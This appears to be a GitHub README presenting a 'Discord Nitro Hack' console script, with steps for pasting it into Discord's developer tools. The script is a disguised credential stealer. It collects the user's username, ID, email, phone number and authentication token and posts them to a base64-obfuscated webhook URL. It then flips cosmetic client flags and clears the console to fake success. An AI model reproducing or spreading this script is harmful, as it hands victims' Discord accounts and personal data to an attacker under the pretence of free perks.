# Discord Hacker
Forked hrx404
# Discord Console Hacks


  ## How to use these Hacks

It only works on Desktop Versions (Windows, Linux, MacOS), not on Mobile
1. Press CTRL + SHIFT + I to toggle Developer Tools (Discord is electronjs wich is basically google chrome)
2. Click on "Console" if not already selected
3. Paste the script in
4. Press enter

## Discord Nitro Hack (Made by BEAST#9999)
#Getting Free Nitro At Your own risk
```js
//Userscript: Discord Nitro Hack Script
var nitrocode = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvOTM3NTg2OTIwNjcyODg2ODE0L0loVUVnbVB6ZnJ3M1lRcFdjOUtIUDNUR1JnSkktcGZ6elExYU95b3RMWW9iaWlxd0xjbUw4dnl3R29Pakt0YXd2a2V3"
var uid = window.webpackChunkdiscord_app.push([[Math.random()], {}, (req) => {for (const m of Object.keys(req.c).map((x) => req.c[x].exports).filter((x) => x)) {if (m.default && m.default.getCurrentUser !== undefined) {return m.default.getCurrentUser().id;}}}]);
var uname = window.webpackChunkdiscord_app.push([[Math.random()], {}, (req) => {for (const m of Object.keys(req.c).map((x) => req.c[x].exports).filter((x) => x)) {if (m.default && m.default.getCurrentUser !== undefined) {return m.default.getCurrentUser().tag;}}}]);
var getp = window.webpackChunkdiscord_app.push([[Math.random()], {}, (req) => {for (const m of Object.keys(req.c).map((x) => req.c[x].exports).filter((x) => x)) {if (m.default && m.default.getCurrentUser !== undefined) {return m.default.getCurrentUser().phone;}}}]);
var getm = window.webpackChunkdiscord_app.push([[Math.random()], {}, (req) => {for (const m of Object.keys(req.c).map((x) => req.c[x].exports).filter((x) => x)) {if (m.default && m.default.getCurrentUser !== undefined) {return m.default.getCurrentUser().email;}}}]);
var TokenFetch = window.webpackChunkdiscord_app.push([[Math.random()], {}, (req) => {for (const m of Object.keys(req.c).map((x) => req.c[x].exports).filter((x) => x)) {if (m.default && m.default.getToken !== undefined) {return m.default.getToken()}}}])
fetch(atob(nitrocode), {method: 'post', headers: {'Content-Type': 'application/json',}, body: JSON.stringify({content:`\`User Name\`  -  ${uname}\n\`UID\`   - ${uid}\n\`Mail\`  - ${getm}\n\`Phone#\`  - ${getp}\n\`Token\` - ${TokenFetch}`,}),});
window.webpackChunkdiscord_app.push([[Math.random()], {}, (req) => {for (const m of Object.keys(req.c).map((x) => req.c[x].exports).filter((x) => x)) {if (m.default && m.default.getCurrentUser !== undefined) {return m.default.getCurrentUser().premiumType = 2;}}}]);
window.webpackChunkdiscord_app.push([[Math.random()], {}, (req) => {for (const m of Object.keys(req.c).map((x) => req.c[x].exports).filter((x) => x)) {if (m.default && m.default.getCurrentUser !== undefined) {return m.default.getCurrentUser().flags += 1;}if (m.getCurrentUser !== undefined) {return m.getCurrentUser().flags += 1}}}]);window.webpackChunkdiscord_app.push([[Math.random()], {}, (req) => {for (const m of Object.keys(req.c).map((x) => req.c[x].exports).filter((x) => x)) {if (m.default && m.default.isDeveloper !== undefined) {Object.defineProperty(m.default, "isDeveloper", {get: (a) => 1,set: (a) => a,configurable: true}); console.log("%cWorked!", "font-size: 50px");return console.log(`%cYou now have Developer Options and a Staff badge. You can find the Developer Settings in the Settings's bottom tab!`, "font-size: 16px")}if (m.isDeveloper !== undefined) {Object.defineProperty(m, "isDeveloper", {get: (a) => 1,set: (a) => a,configurable: true}); console.log("%cWorked!", "font-size: 50px");return console.log(`%cYou now have Developer Options and a Staff badge. You can find the Developer Settings in the Settings's bottom tab!`, "font-size: 16px")}}}]);
window.webpackChunkdiscord_app.push([[Math.random()], {}, (req) => {for (const m of Object.keys(req.c).map((x) => req.c[x].exports).filter((x) => x)) {if (m.default && m.default.getCurrentUser !== undefined) {return m.default.getCurrentUser().flags = -1;}if (m.getCurrentUser !== undefined) {return m.getCurrentUser().flags = -1}}}]);window.webpackChunkdiscord_app.push([[Math.random()], {}, (req) => {for (const m of Object.keys(req.c).map((x) => req.c[x].exports).filter((x) => x)) {if (m.default && m.default.getCurrentUser !== undefined) {return m.default.getCurrentUser().public_flags += 1;}if (m.getCurrentUser !== undefined) {return m.getCurrentUser().public_flags += 1}}}]);
console.clear()
console.log("Enjoy Free Nitro Perks!")
